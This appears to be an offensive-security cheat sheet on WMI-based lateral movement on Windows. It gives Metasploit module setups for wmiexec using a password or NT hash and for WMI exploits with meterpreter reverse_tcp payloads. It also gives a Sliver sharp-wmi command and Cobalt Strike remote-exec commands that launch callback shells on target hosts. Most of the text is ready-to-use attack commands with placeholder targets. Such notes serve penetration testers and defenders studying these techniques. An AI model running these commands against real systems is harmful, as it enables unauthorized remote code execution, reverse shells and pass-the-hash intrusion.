# Windows Management Instrumentation Command line (WMIC)

## 04 - Metasploit

### 4.1 - Modules

TODO: Fill the missing info and contain internal references


```
msf > use auxiliary/scanner/smb/impacket/wmiexec

msf auxiliary(scanner/smb/impacket/wmiexec) > options

Module options (auxiliary/scanner/smb/impacket/wmiexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     yes       The command to execute
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     yes       The password for the specified username
   SMBUser                     yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/smb/impacket/wmiexec) > set command <commands>

msf auxiliary(scanner/smb/impacket/wmiexec) > set rhosts <target_IP>

msf auxiliary(scanner/smb/impacket/wmiexec) > set output true

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbuser <username>

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbdomain <domain>

msf auxiliary(scanner/smb/impacket/wmiexec) > set threads 2

msf auxiliary(scanner/smb/impacket/wmiexec) > run
```

## Interactive Session

```
msf > use exploit/windows/local/ps_wmi_exec

msf exploit(windows/local/ps_wmi_exec) > options

Module options (exploit/windows/local/ps_wmi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DOMAIN                     no        Domain or machine name
   PASSWORD                   no        Password to authenticate with
   RHOSTS                     no        Target address range or CIDR identifier
   SESSION                    yes       The session to run this module on
   USERNAME                   no        Username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal
```

```
msf > use exploit/windows/local/wmi

msf exploit(windows/local/wmi) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/wmi) > options

Module options (exploit/windows/local/wmi):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS                                yes       Target address range or CIDR identifier
   ReverseListenerComm                   no        The specific communication channel to use for this listener
   SESSION                               yes       The session to run this module on
   SMBDomain                             no        The Windows domain to use for authentication
   SMBPass                               no        The password for the specified username
   SMBUser                               no        The username to authenticate as
   TIMEOUT              10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```


```
msf > use post/windows/gather/wmic_command

msf post(windows/gather/wmic_command) > options

Module options (post/windows/gather/wmic_command):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     no        WMIC command options.
   RESOURCE                    no        Full path to resource file to read commands from.
   RHOST      localhost        yes       Target address range
   SESSION                     yes       The session to run this module on
   SMBDomain                   no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   TIMEOUT    10               yes       Timeout for WMI command in seconds

msf post(windows/gather/wmic_command) > set session <session_id>

msf post(windows/gather/wmic_command) > set rhost <target_IP>

msf post(windows/gather/wmic_command) > set smbuser <username>

msf post(windows/gather/wmic_command) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf post(windows/gather/wmic_command) > set command <WQL Queries>

msf post(windows/gather/wmic_command) > run
```

## 05 - Sliver

### 5.1 - Spawn Callback Shell

```
sliver (IMPLANT_NAME) > sharp-wmi action=exec computername=<IP> command=\"""C:\\Windows\\Temp\\shell.exe""\"
```

## 06 - Havoc

TODO: Demonstrate commands using wmiexec with Havoc

## 07 - Cobalt Strike

### 7.1 - Remote-Exec

#### 7.1.1 - Spawn Callback Shell

```
beacon> remote-exec wmi <IP> C:\path\to\shell.exe

beacon> remote-exec wmi <IP> "rundll32 C:\path\to\shell.dll"

beacon> link <IP>
```

#### 7.1.2 - Execute Commands

```
beacon> remote-exec wmi <IP> <cmdlets>
```

---
## References

- [Lateral Movement Command Execution Win32_Service](https://www.sakshamdixit.com/lateral-movement-command-execution-win32_service/)

- [Backdoor with WMI](https://www.sakshamdixit.com/backdoor-with-wmi/)

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)

- [SharpWMI](https://github.com/GhostPack/SharpWMI)